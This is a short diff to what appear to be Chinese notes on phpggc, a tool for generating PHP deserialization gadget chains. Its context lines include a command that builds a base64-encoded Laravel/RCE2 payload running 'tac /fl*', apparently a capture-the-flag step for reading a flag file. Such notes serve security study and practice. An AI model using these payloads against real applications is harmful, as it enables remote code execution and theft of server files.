@@ -28,8 +28,10 @@ https://github.com/ambionics/phpggc
 ./phpggc -l
 列出全部
 
+./phpggc -l Laravel
+
 ./phpggc -i Laravel/RCE2 
-列出框架的
+列出
 
 ./phpggc  Laravel/RCE2 system 'tac /fl*' |base64
 生成序列化串
